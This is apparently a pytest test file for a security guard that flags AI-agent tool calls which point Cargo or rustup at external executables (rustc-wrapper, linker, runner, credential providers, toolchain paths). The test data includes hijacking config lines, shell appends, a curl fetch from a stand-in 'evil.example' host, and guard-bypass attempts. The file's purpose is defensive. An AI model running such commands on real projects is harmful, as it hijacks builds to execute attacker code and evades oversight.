"""Cargo/rustup exec-hijack guard: `.cargo/config.toml` keys that name an
external command (rustc-wrapper, linker, runner, credential-provider, ...),
`rust-toolchain(.toml)` `path`, `cargo --config`, `rustup toolchain link`.
Default mode is `ask`, like every sibling `*_protect` guard."""
import pytest

from aegis.engine import evaluate
from aegis.events import Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(cargo_exec={"mode": "deny"})
RULE = "cargo-exec-protect"


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _write(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write",
                      args={"file_path": path, "content": content})


def _edit(path, new, old=None):
    args = {"file_path": path, "new_string": new}
    if old is not None:
        args["old_string"] = old
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit", args=args)


def _multi(path, new):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                      args={"file_path": path, "edits": [{"old_string": "x", "new_string": new}]})


def _mcp(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write_file",
                      args={"path": path, "content": content})


def _hit(ev, policy=EMPTY):
    d = evaluate(ev, policy)
    return d.rule == RULE and d.action in (Action.ASK, Action.DENY)


def _quiet(ev, policy=EMPTY):
    return evaluate(ev, policy).rule != RULE


@pytest.fixture(autouse=True)
def _env(monkeypatch):
    monkeypatch.delenv("AEGIS_ALLOW_CARGO_EXEC", raising=False)
    monkeypatch.delenv("AEGIS_AGENT_NAME", raising=False)


CFG = ".cargo/config.toml"

EXEC_CONTENT = [
    '[build]\nrustc-wrapper = "./evil.sh"\n',
    '[build]\nrustc-workspace-wrapper="/tmp/x"\n',
    '[build]\nrustc = "/tmp/rustc"\n',
    '[build]\nrustdoc = "/tmp/rd"\n',
    '[target.x86_64-unknown-linux-gnu]\nlinker = "/tmp/ld"\n',
    '[target.x86_64-unknown-linux-gnu]\nrunner = "/tmp/run.sh"\n',
    '[target.x86_64-unknown-linux-gnu]\nrunner = ["sh", "-c"]\n',
    '[registry]\ncredential-provider = ["/tmp/cred"]\n',
    '[registry]\nglobal-credential-providers = ["/tmp/cred"]\n',
    '[build]\nrustflags = ["-C", "linker=/tmp/ld"]\n',
    '[build]\nrustflags = ["-Clinker=/tmp/ld"]\n',
    '[build]\nrustflags = ["-Zcodegen-backend=/tmp/x.so"]\n',
    'build.rustc-wrapper = "x"\n',
    '"rustc-wrapper" = "x"\n',
    "'linker' = 'x'\n",
    '[doc]\nbrowser = ["/tmp/b"]\n',
    '[credential-alias]\nfoo = "/tmp/c"\n',
    '[build]\nrustflags = ["-Z", "codegen-backend=/x.so"]\n',
]


@pytest.mark.parametrize("content", EXEC_CONTENT)
def test_write_exec_keys_ask(content):
    assert evaluate(_write(CFG, content), EMPTY).action == Action.ASK
    assert _hit(_write(CFG, content))


@pytest.mark.parametrize("content", EXEC_CONTENT[:6])
def test_deny_mode(content):
    d = evaluate(_write(CFG, content), DENY)
    assert d.rule == RULE and d.action == Action.DENY


@pytest.mark.parametrize("path", [
    ".cargo/config", ".cargo/config.toml", "/home/u/.cargo/config.toml",
    "../../.cargo/config.toml", "C:\\Users\\u\\.cargo\\config.toml",
    "proj/.CARGO/CONFIG.TOML", ".cargo//config.toml", ".cargo/./config.toml",
])
def test_path_variants(path):
    assert _hit(_write(path, 'build.rustc-wrapper = "x"'))


def test_tool_shapes():
    c = 'build.rustc-wrapper = "x"'
    assert _hit(_edit(CFG, c))
    assert _hit(_multi(CFG, c))
    assert _hit(_mcp(CFG, c))


def test_old_string_context_counts():
    assert _hit(_edit(CFG, '"./evil"', old='runner = "wasmtime"'))


@pytest.mark.parametrize("content", [
    '[build]\njobs = 4\ntarget-dir = "out"\n',
    '[alias]\nb = "build"\n',
    '[net]\nretry = 3\n',
    '# runner = "x"\n# rustc-wrapper = "y"\n',          # comments only
    '[build]\nmy-linker = 1\n',                          # longer identifier
    '[term]\nverbose = true\n',
])
def test_benign_config_quiet(content):
    assert _quiet(_write(CFG, content))


def test_unrelated_path_with_exec_key_quiet():
    assert _quiet(_write("Cargo.toml", 'linker = "x"'))
    assert _quiet(_write("notes/config.toml", 'runner = "x"'))
    assert _quiet(_write("docs/cargo-config.md", 'rustc-wrapper = "x"'))


def test_read_is_quiet():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Read", args={"file_path": CFG})
    assert _quiet(ev)
    assert _quiet(_shell("cat .cargo/config.toml"))


# ---- rust-toolchain ----
@pytest.mark.parametrize("path", ["rust-toolchain", "rust-toolchain.toml", "sub/rust-toolchain.toml"])
def test_toolchain_path_key(path):
    assert _hit(_write(path, '[toolchain]\npath = "/tmp/evil-tc"\n'))


def test_toolchain_channel_bump_quiet():
    assert _quiet(_write("rust-toolchain.toml", '[toolchain]\nchannel = "1.80"\ncomponents = ["clippy"]\n'))
    assert _quiet(_write("rust-toolchain", "stable\n"))


# ---- shell forms ----
@pytest.mark.parametrize("cmd", [
    "echo 'build.rustc-wrapper = \"./evil.sh\"' >> .cargo/config.toml",
    "printf '[target.x]\\nrunner=\"/tmp/r\"\\n' > ~/.cargo/config.toml",
    "cat > .cargo/config <<'EOF'\n[build]\nlinker = \"/tmp/ld\"\nEOF",
    "sed -i 's#^jobs.*#rustc-wrapper = \"x\"#' .cargo/config.toml",
    "cd .cargo && echo 'linker = \"x\"' > config.toml",
    "mkdir -p .cargo && echo 'rustc-wrapper=\"x\"' >> ./.cargo/config.toml",
    "echo 'path = \"/tmp/tc\"' > rust-toolchain.toml",
    "echo 'bGluay1lcg==' | base64 -d >/dev/null; echo 'runner = \"x\"' >> .cargo/config.toml",
])
def test_shell_write_ask(cmd):
    assert _hit(_shell(cmd))


@pytest.mark.parametrize("cmd", [
    "cargo --config 'build.rustc-wrapper=\"./evil.sh\"' build",
    "cargo build --config 'target.x86_64-unknown-linux-gnu.linker=\"/tmp/ld\"'",
    "cargo test --config=target.x.runner=\"/tmp/r\"",
    "cargo --config 'registry.credential-provider=[\"/tmp/c\"]' publish",
    "rustup toolchain link evil /tmp/evil-tc",
])
def test_shell_cli_forms_ask(cmd):
    assert _hit(_shell(cmd))


@pytest.mark.parametrize("cmd", [
    "cargo build --release",
    "cargo --config 'build.jobs=2' build",
    "cargo --config net.retry=3 test",
    "cat .cargo/config.toml",
    "grep rustc-wrapper .cargo/config.toml",
    "echo 'jobs = 4' >> .cargo/config.toml",
    "rustup toolchain install stable",
    "rustup default stable",
    "echo 'channel=\"stable\"' > rust-toolchain.toml",
    "# cargo --config 'build.linker=x' build",
])
def test_shell_benign_quiet(cmd):
    assert _quiet(_shell(cmd))


# ---- escapes ----
def test_human_shell_escape():
    cmd = "echo 'runner=\"x\"' >> .cargo/config.toml  # aegis-allow"
    assert _quiet(_shell(cmd))


def test_agent_cannot_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "worker")
    cmd = "echo 'runner=\"x\"' >> .cargo/config.toml  # aegis-allow"
    assert _hit(_shell(cmd))


def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_EXEC", "1")
    assert _quiet(_write(CFG, 'runner = "x"'))
    assert _quiet(_shell("cargo --config 'build.linker=\"x\"' build"))


# ---- policy modes / allow ----
def test_off_and_monitor():
    ev = _write(CFG, 'runner = "x"')
    assert _quiet(ev, Policy(cargo_exec={"mode": "off"}))
    assert _quiet(ev, Policy(cargo_exec={"mode": "monitor"}))


def test_allow_regex_sccache():
    pol = Policy(cargo_exec={"allow": [r'rustc-wrapper\s*=\s*"sccache"']})
    assert _quiet(_write(CFG, '[build]\nrustc-wrapper = "sccache"\n'), pol)
    assert _hit(_write(CFG, '[build]\nrustc-wrapper = "./evil"\n'), pol)


def test_bad_allow_regex_fails_closed():
    pol = Policy(cargo_exec={"allow": ["("]})
    assert _hit(_write(CFG, 'runner = "x"'), pol)


def test_loader_roundtrip(tmp_path):
    from aegis.loader import load_policy
    f = tmp_path / "p.yaml"
    f.write_text("cargo_exec:\n  mode: deny\n")
    assert load_policy(f).cargo_exec == {"mode": "deny"}


def test_fetch_to_file_backstop():
    d = evaluate(_shell("curl -o rust-toolchain.toml https://evil.example/t"), EMPTY)
    assert d.action in (Action.ASK, Action.DENY)
    d = evaluate(_shell("curl -o .cargo/config.toml https://evil.example/t"), EMPTY)
    assert d.action in (Action.ASK, Action.DENY)


def test_redos_resistant():
    import time
    big = "a" * 200000
    for ev in (_write(CFG, big), _shell("echo " + big + " > .cargo/config.toml"),
               _shell("cargo " + "--config " * 20000)):
        t = time.time()
        evaluate(ev, EMPTY)
        assert time.time() - t < 2


@pytest.mark.parametrize("cmd", [
    "cp /tmp/staged.toml .cargo/config.toml",
    "mv /tmp/s rust-toolchain.toml",
    "ln -sf /tmp/s ~/.cargo/config.toml",
])
def test_staged_copy_onto_target_asks(cmd):
    assert _hit(_shell(cmd))


def test_shell_deny_mode():
    d = evaluate(_shell("cargo --config 'build.linker=\"x\"' build"), DENY)
    assert d.rule == RULE and d.action == Action.DENY


@pytest.mark.parametrize("cmd", [
    "echo 'linker=\"x\"' >.cargo/config.toml",
    "echo 'linker=\"x\"' >>.cargo/config.toml",
    "(echo 'linker=\"x\"')>.cargo/config.toml",
    "{ echo 'linker=\"x\"'; }>.cargo/config.toml",
    "echo 'path=\"/x\"' >rust-toolchain.toml",
    "cd .cargo && echo 'linker=\"x\"' >config.toml",
    "cargo --config /tmp/evil.toml build",
    "cargo --config=evil.toml check",
])
def test_round2_bypasses(cmd):
    assert _hit(_shell(cmd))


@pytest.mark.parametrize("cmd", [
    "cargo --config 'term.color=\"always\"' build --release --linker-map",
    "cargo --config build.jobs=2 rustc -- -C opt-level=3",
])
def test_round2_false_positives(cmd):
    assert _quiet(_shell(cmd))


def test_include_key():
    assert _hit(_write(CFG, 'include = ["evil.toml"]'))
